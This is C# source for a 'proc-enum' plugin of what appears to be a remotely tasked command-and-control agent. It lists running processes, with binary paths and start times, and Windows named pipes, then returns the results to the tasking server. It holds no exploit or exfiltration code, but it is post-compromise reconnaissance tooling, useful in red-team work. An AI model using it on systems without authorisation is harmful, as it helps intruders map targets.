using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text.Json;
using Workflow.Contracts;
using Workflow.Models;
using Workflow.Utilities;

namespace Workflow
{
    public class Plugin : IModule
    {
        public string Name => "proc-enum";
        private IDataBroker messageManager { get; set; }

        public Plugin(PluginContext context)
        {
            this.messageManager = context.MessageManager;
        }

        public async Task Execute(ServerJob job)
        {
            DebugLog.Log($"Executing {Name} [{job.task.id}]");
            try
            {
                var args = JsonSerializer.Deserialize<proc_enum.ProcEnumArgs>(
                    job.task.parameters) ?? new proc_enum.ProcEnumArgs();

                switch (args.action)
                {
                    case "ps":
                        ExecutePs(job);
                        break;
                    case "proc-enum":
                        ExecuteProcEnum(job);
                        break;
                    case "named-pipes":
                        ExecuteNamedPipes(job);
                        break;
                    default:
                        throw new ArgumentException(
                            $"Unknown action: {args.action}");
                }
            }
            catch (Exception e)
            {
                DebugLog.Log(
                    $"{Name} error: {e.Message} [{job.task.id}]");
                messageManager.Write(
                    e.ToString(), job.task.id, true, "error");
            }
        }

        private void ExecutePs(ServerJob job)
        {
            List<ServerProcessInfo> processes = new();

            if (OperatingSystem.IsWindows())
            {
                DebugLog.Log(
                    $"{Name} using Windows process enumeration"
                    + $" [{job.task.id}]");
                processes.AddRange(
                    ProcessHelper.GetProcessesWithParent());
            }
            else
            {
                DebugLog.Log(
                    $"{Name} using generic process enumeration"
                    + $" [{job.task.id}]");
                processes.AddRange(
                    ConvertProcessToServerProcess(
                        Process.GetProcesses()));
            }

            DebugLog.Log(
                $"{Name} found {processes.Count} processes"
                + $" [{job.task.id}]");
            messageManager.AddTaskResponse(new ProcessTaskResponse
            {
                task_id = job.task.id,
                completed = true,
                user_output =
                    "Finished, check process browser for output",
                processes = processes
            });
        }

        private void ExecuteProcEnum(ServerJob job)
        {
            var processes = new List<Dictionary<string, object>>();
            foreach (var proc in Process.GetProcesses())
            {
                try
                {
                    var info = new Dictionary<string, object>
                    {
                        ["pid"] = proc.Id,
                        ["name"] = proc.ProcessName,
                        ["threads"] = proc.Threads.Count,
                        ["memory_mb"] =
                            proc.WorkingSet64 / (1024 * 1024)
                    };
                    try
                    {
                        info["start_time"] =
                            proc.StartTime.ToString("o");
                    }
                    catch { }
                    processes.Add(info);
                }
                catch { }
                finally { proc.Dispose(); }
            }
            var json = JsonSerializer.Serialize(processes,
                new JsonSerializerOptions { WriteIndented = true });
            messageManager.AddTaskResponse(new TaskResponse
            {
                completed = true,
                user_output = json,
                task_id = job.task.id
            });
        }

        private void ExecuteNamedPipes(ServerJob job)
        {
            if (!RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
                throw new PlatformNotSupportedException(
                    "Named pipes enumeration is only available"
                    + " on Windows");

            var pipes = Directory.GetFiles(@"\\.\pipe\");
            var json = JsonSerializer.Serialize(pipes,
                new JsonSerializerOptions { WriteIndented = true });
            messageManager.AddTaskResponse(new TaskResponse
            {
                completed = true,
                user_output = json,
                task_id = job.task.id
            });
        }

        private List<ServerProcessInfo> ConvertProcessToServerProcess(
            Process[] procs)
        {
            List<ServerProcessInfo> processes = new();

            foreach (var proc in procs)
            {
                try
                {
                    processes.Add(new ServerProcessInfo()
                    {
                        process_id = proc.Id,
                        name = proc.ProcessName,
                        description = proc.MainWindowTitle,
                        bin_path = proc.MainModule.FileName,
                        start_time =
                            new DateTimeOffset(proc.StartTime)
                                .ToUnixTimeMilliseconds(),
                    });
                }
                catch
                {
                    processes.Add(new ServerProcessInfo()
                    {
                        process_id = proc.Id,
                        name = proc.ProcessName,
                        description = proc.MainWindowTitle,
                    });
                }
            }

            return processes;
        }
    }
}
